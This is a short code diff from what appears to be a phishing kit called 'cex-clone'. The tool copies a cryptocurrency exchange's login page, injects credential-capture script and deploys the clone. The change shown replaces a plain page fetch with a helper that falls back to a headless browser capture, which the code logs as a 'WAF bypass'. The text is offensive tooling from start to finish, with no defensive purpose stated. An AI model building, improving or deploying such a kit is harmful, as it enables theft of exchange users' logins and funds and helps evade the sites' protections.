@@ -13,7 +13,7 @@ import {
   buildCredCaptureJs,
   deployStaticClone,
   downloadAssets,
-  fetchWithTimeout,
+  fetchCexLoginHtml,
   injectCexScripts,
   resolveBackendUrl,
   resolveCexNameFromUrl,
@@ -124,10 +124,11 @@ async function main(): Promise<void> {
   await mkdir(cli.outDir, { recursive: true })
 
   console.info(`[cex-clone] Fetching login page…`)
-  const pageRes = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } })
-  if (!pageRes.ok) fail(`Failed to fetch page: HTTP ${pageRes.status}`)
-
-  let html = await pageRes.text()
+  const { html: fetchedHtml, usedHeadless } = await fetchCexLoginHtml(target, cli.outDir)
+  if (usedHeadless) {
+    console.info('[cex-clone] Headless capture used (WAF bypass)')
+  }
+  let html = fetchedHtml
   const assetsDir = path.join(cli.outDir, 'assets')
   const urlToLocal = await downloadAssets(html, target, assetsDir)
   html = rewriteHtmlAssets(html, target, urlToLocal)
